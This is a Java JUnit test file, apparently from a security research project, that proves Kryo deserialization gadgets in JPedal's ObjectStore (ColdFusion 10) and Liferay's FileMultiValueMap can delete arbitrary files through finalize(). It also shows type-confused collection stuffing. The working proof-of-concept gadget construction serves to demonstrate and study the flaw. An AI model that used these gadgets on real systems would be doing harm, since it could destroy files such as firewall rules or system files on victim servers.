package com.contrastsecurity.serialbox;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

import junit.framework.TestCase;

import org.apache.commons.io.FileUtils;
import org.jpedal.io.ObjectStore;
import org.junit.Test;

import refutils.util.FieldHelper;

import com.esotericsoftware.kryo.Kryo;
import com.esotericsoftware.kryo.io.Input;
import com.esotericsoftware.kryo.io.Output;

/**
 * This test case affirms abuse cases for the following gadgets:
 * 
 * org.jpedal.io.ObjectStore - packaged with ColdFusion 10, and can be used to delete any file
 * com.liferay.portal.util.FileMultiValueMap - packaged with Liferay, and can be used to delete any file
 */
public class KryoTest extends TestCase {
	
	private Kryo kryo;
	private ByteArrayOutputStream baos;
	private Output out;
	private Input in;
	private boolean addedLiferayJars;
	
	@Override
	protected void setUp() throws Exception {
		kryo = new Kryo();
		baos = new ByteArrayOutputStream();
		out = new Output(baos);
		
		if(!addedLiferayJars) {
			addLiferayJars();
			addedLiferayJars = true;
		}
	}
	
	@Test
	public void testGenericCollectionStuffing() throws Exception {
		List<String> listOfStrings = new ArrayList<String>();
		listOfStrings.add("contrast");
		listOfStrings.add("security");
		listOfStrings.add("foo");
		
		FieldHelper listHelper = new FieldHelper(listOfStrings);
		listHelper.setValue("elementData", new Object[]{"i","stuffed", new Long(1)});
		
		kryo.writeObject(out, listOfStrings);
		in = new Input(out.toBytes());
		List<String> rebuiltList = kryo.readObject(in, new ArrayList<String>().getClass());
		assertEquals("i", rebuiltList.get(0));
		assertEquals("stuffed", rebuiltList.get(1));
		assertFalse(rebuiltList.get(2) instanceof String);
	}

	/**
	 * We add these libraries manually from source repositories
	 * instead of from a dependency resolver because some of them
	 * are from the app, and not available in maven, and because
	 * we are sure these are the versions compatible to Liferay.
	 * 
	 * This is all for setting up a unit test -- the target app 
	 * would have all of these on the classpath already.
	 */
	private void addLiferayJars() throws IOException {
		addToClassloader("lib/portal-service.jar");
		addToClassloader("lib/portal-impl.jar");
		addToClassloader("lib/util-java.jar");
		addToClassloader("lib/easyconf.jar");
		addToClassloader("lib/commons-collections.jar");
		addToClassloader("lib/commons-configuration.jar");
		addToClassloader("lib/commons-beanutils.jar");
		addToClassloader("lib/commons-digester.jar");
	}
	
	@SuppressWarnings({ "rawtypes", "unchecked" })
	@Test
	public void testCF10_JPedal() throws Exception {
		
		/*
		 * Write the test file to disk. This could easily be a firewall rules
		 * file, /etc/passwd, or something else hilarious.
		 */
		String targetFile = "target/fileToDelete.txt";
		FileUtils.write(new File(targetFile), "this fill will be deleted by ObjectStore#finalize()");
		
		/*
		 * Confirm the file was written successfully.
		 */
		assertTrue(new File(targetFile).exists());
		
		/*
		 * Create our malicious object that will delete the target file when
		 * finalized.
		 */
		ObjectStore store = new ObjectStore();
		HashMap map = new HashMap();
		map.put("can be anything", targetFile); // put the target file as a value in the map
		FieldHelper storeHelper = new FieldHelper(store);
		storeHelper.setValue("imagesOnDiskAsBytes", map);
		
		kryo.writeObject(out, store);
		
		/*
		 * Rebuild the malicious object as the victim app would.
		 */
		in = new Input(out.toBytes());
		ObjectStore rebuiltStore = kryo.readObject(in, ObjectStore.class);
		
		/*
		 * Call finalize() -- they made it protected so we have to reflect 
		 * the invocation. In a real attack scenario, the GC thread would 
		 * call this, but that's hard to build a test case around because 
		 * it's execution is not deterministic.
		 */
		callFinalize(rebuiltStore);
		
		/*
		 * Confirm that the gadget deleted the file.
		 */
		assertFalse(new File(targetFile).exists());
	}

	private void callFinalize(Object obj) throws Exception {
		Class<?> objClass = obj.getClass();
		Method finalize = objClass.getDeclaredMethod("finalize", new Class[]{});
		finalize.setAccessible(true);
		finalize.invoke(obj, new Object[]{});
	}

	@Test
	public void testLiferay_FileMultiValueMap() throws Exception {
		
		/*
		 * Write the test file to disk. This could easily be a firewall rules
		 * file, /etc/passwd, or something else hilarious.
		 */
		String targetFilePrefix = "target/liferayFileToDelete";
		String targetFile = targetFilePrefix + ".properties";
		FileUtils.write(new File(targetFile), "this fill will be deleted by FileMultiValueMap#finalize()");
		
		/*
		 * Make sure our file exists.
		 */
		assertTrue(new File(targetFile).exists());
		
		/*
		 * Setup Liferay classes. This obviously won't need to happen in a 
		 * target's environment.
		 */
		setupLiferayEnvironment();
		
		/*
		 * Make the malicious FileMultiValueMap.
		 */
		Class<?> mapClass = Class.forName("com.liferay.portal.util.FileMultiValueMap");
		Object/*com.liferay.portal.util.FileMultiValueMap*/ map = mapClass.newInstance();
		FieldHelper mapHelper = new FieldHelper(map);
		mapHelper.setValue("_fileName", targetFilePrefix);
		callFinalize(map);
		
		/*
		 * Make sure the malicious file's finalize() deleted the target file.
		 */
		assertFalse(new File(targetFile).exists());
	}
	
	/**
	 * We have to setup a bunch of stuff that will already be present in Liferay environments.
	 */
    private void setupLiferayEnvironment() throws Exception {
    	/*
		 * Setup temp file singletons.
		 */
		Object/*FileImpl*/ fileImpl = getStatic("com.liferay.portal.util.FileImpl", "getInstance");
		Class<?> fileUtilClass = Class.forName("com.liferay.portal.kernel.util.FileUtil");
		Field singletonField = fileUtilClass.getDeclaredField("_file");
		singletonField.setAccessible(true);
		singletonField.set(null, fileImpl);
		
		/*
		 * Setup date singleton.
		 */
		Object/*FileImpl*/ dateFactoryUtilImpl = Class.forName("com.liferay.portal.util.FastDateFormatFactoryImpl").newInstance();
		Class<?> dateFactoryUtilClass = Class.forName("com.liferay.portal.kernel.util.FastDateFormatFactoryUtil");
		singletonField = dateFactoryUtilClass.getDeclaredField("_fastDateFormatFactory");
		singletonField.setAccessible(true);
		singletonField.set(null, dateFactoryUtilImpl);
		
		/*
		 * Setup DB singleton.
		 */
		Object/*FileImpl*/ dbFactoryImpl = Class.forName("com.liferay.portal.dao.db.DBFactoryImpl").newInstance();
		Class<?> dbFactoryClass = Class.forName("com.liferay.portal.kernel.dao.db.DBFactoryUtil");
		singletonField = dbFactoryClass.getDeclaredField("_dbFactory");
		singletonField.setAccessible(true);
		singletonField.set(null, dbFactoryImpl);
		
		Class<?>/*HypersonicDB*/ dbClass = Class.forName("com.liferay.portal.dao.db.HypersonicDB");
		Constructor<?> dbConstr = dbClass.getDeclaredConstructors()[0];
		dbConstr.setAccessible(true);
		Object/*HypersonicDB*/ db = dbConstr.newInstance();
		Field dbField = dbFactoryImpl.getClass().getDeclaredField("_db");
		dbField.setAccessible(true);
		dbField.set(dbFactoryImpl, db);
	}

	private Object getStatic(String className, String methodName) throws Exception {
		Class<?> cls = Class.forName(className);
		Method method = cls.getDeclaredMethod(methodName);
		return method.invoke(null, new Object[0]);
	}

	public static void addToClassloader(String s) throws IOException
    {
        File f = new File(s);
        addToClassloader(f);
    }

    public static void addToClassloader(File f) throws IOException
    {
    	addToClassloader(f.toURI().toURL());
    }

    protected static void addToClassloader(URL u) throws IOException
    {
        URLClassLoader sysloader = (URLClassLoader) ClassLoader.getSystemClassLoader();
        Class<?> sysclass = URLClassLoader.class;

        try {
            Method method = sysclass.getDeclaredMethod("addURL", ADDURL_PARAMS);
            method.setAccessible(true);
            method.invoke(sysloader, new Object[] {u});
        } catch (Throwable t) {
            t.printStackTrace();
            throw new IOException("Error, could not add URL to system classloader");
        }

    }
    
    private static final Class<?>[] ADDURL_PARAMS = new Class[] {URL.class};
}
